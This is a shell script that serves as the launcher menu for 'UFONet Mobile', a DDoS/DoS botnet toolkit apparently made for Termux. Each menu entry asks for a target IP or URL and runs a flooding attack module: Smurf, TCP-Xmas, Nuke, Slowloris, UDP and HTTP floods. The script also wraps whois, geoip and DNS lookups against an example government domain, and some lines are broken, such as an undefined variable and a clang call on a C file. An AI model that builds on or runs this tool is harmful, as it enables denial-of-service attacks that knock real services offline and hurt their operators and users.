
"""
The MIT License (MIT)

Copyright (c) <2019> <Ufonet Mobile>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
"""

clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
echo $green"========================================================================================

888     888 8888888888 .d88888b.  888b    888          888    
888     888 888        d88PY888b  8888b   888          888    
888     888 888       888     888 88888b  888          888    
888     888 8888888   888     888 888Y88b 888  .d88b.  888888 
888     888 888       888     888 888 Y88b888 d8P  Y8b 888    
888     888 888       888     888 888  Y88888 88888888 888    
Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  
 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888

========================================================================================

 ▼ UFONet [ DDoS+DoS ] Botnet/Ufonet Mobile Version V2 ▼

========================================================================================"
echo $green""" CARGO INFO [INFO KARGO KAPAL LUAR ANGKASA ANDA]

*ENGINES --> 
          _>BOTS       :  [0020000]

*WEAPONS [00010]
    
*BOTNET --> (DDoS)
         _>SMURF       :  BIG Packet Attack
         _>TACHYON     :  TCP/UDP ATTACK
         _>NEBULA      :  Fast HTTP request
         _>IKARUS      :  HTTP Flooder

*CLOSE COMBAT --> (DoS)
         _>LORIS       :  Slow HTTP requests
         _>XMAS        :  TCP-Xmas Flooder
         _>NUKE        :  TCP-STARVATION Attack
         _>SAGATRON    :  UDP ATTACK 1,5GB Packet
         _>DARKSTAR    :  ALIEN POST

*TOOLS -->
         _>SAMUC        :  WHOIS CHECK
         _>ENTERPRISE   :  GEOIP LOOKUP
         _>GRACE HOOPER :  DNS LOOKUP
         _>SAMUS        :  GLOBAL LIVE ATTACK
         _WARGAMES      :  GLOBAL CHAT
"""
echo
echo " ▼╭─[~Ufonet/Mothership]" 
read -p "   ╰────>" in;

if [ $in = ./Ufonet-Smurf ] || [ $in = ./Ufonet-Smurf ]
then
cd mobs
python2 smurf.py
fi

#MODS3

if [ $in = ./Ufonet-Xmas ] || [ $in = ./Ufonet-Xmas ]
then
cd mobs
python2 xmas.py
fi

#MODS4

if [ $in = ./Ufonet-Nuke ] || [ $in = ./Ufonet-Nuke ]
then
cd mobs
read -p "IP TARGET:" ip;
printf "Anda menggunakan Nuke" >> $missions.txt
python nuke.py -s$nuke -p80 -t100
fi

#MODS

if [ $in = ./Ufonet-Tachyon ] || [ $in = ./Ufonet-Tachyon ]
then
cd mobs
perl tachyon.pl
fi

#MODS6

if [ $in = ./Ufonet-Loris ] || [ $in = ./Ufonet-Loris ]
then
read -p "IP TARGET:" tar;
cd mobs
python2 loris.py $tar 80 100
fi

if [ $in = ./Ufonet--Attack-Nebula ] || [ $in = ./Ufonet-Nebula ]
then
cd mobs
read -p "URL TARGET:" ne;
clang smurf.c $ne 80
fi

if [ $in = ./Ufonet-Sagatron ] || [ $in = ./Ufonet-Sagatron ]
then
cd mobs
read -p "TARGET IP" sa;
perl sagatron.pl $sa
fi


if [ $in = ./Ufonet-Ikarus ] || [ $in = ./Ufonet-Ikarus ]
then
cd mobs
read -p "IP TARGET:" om;
python2 ikarus.py $om 80 100
fi

if [ $in = ./Ufonet-Darkstar ] || [ $in = ./Ufonet-Darkstar ]
then
cd mobs
python darkstar.py
fi

if [ $in = ./Test-Samuc ] || [ $in = ./Test-Samuc ]
then
read -p "URL EX:kpu.go.id" tar;
sleep 1
echo $red"CONNETING URL...."
sleep 1
echo $green"LOADING.."
echo $white"WHOIS LOOKUP $tar"
curl http://api.hackertarget.com/whois/?q=$tar
fi

if [ $in = ./Inspec-Samuc ] || [ $in = ./Inspec-Samuc ]
then
read -p "URL EX:kpu.go.id:" tar;
sleep 1
echo $red"CONNETING URL...."
sleep 1
echo $green"LOADING.."
echo $white"WHOIS LOOKUP $tar"
curl http://api.hackertarget.com/whois/?q=$tar
fi


if [ $in = ./Inspec-Enterprise ] || [ $in = ./Inspec-Enterprise ]
then
read -p "URL EX:kpu.go.id:" tar;
sleep 1
echo $red"CONNETING URL...."
sleep 1
echo $green"LOADING.."
echo $white"GEOIP LOOKUP $tar"
echo
curl http://api.hackertarget.com/geoip/?q=$tar
fi

if [ $in = ./Test-Gracehooper ] || [ $in = ./Test-Gracehooper ]
then
read -p "URL EX:kpu.go.id:" tar;
sleep 1
echo $red"CONNETING URL...."
sleep 1
echo $green"LOADING.."
echo $white"DNS LOOKUP $tar"
curl http://api.hackertarget.com/dnslookup/?q=$tar
echo
fi

if [ $in = ./Wargames ] || [ $in = ./Wargames ]
then
echo $red"OPEN WARGAMES"
termux-open-url http://ufonetmobile.chatango.com/
fi

if [ $in = ./Samuc ] || [ $in = ./samuc ]
then
echo $red"OPEN WARGAMES"
termux-open-url http://www.dsfofficial.tk/map.html
fi

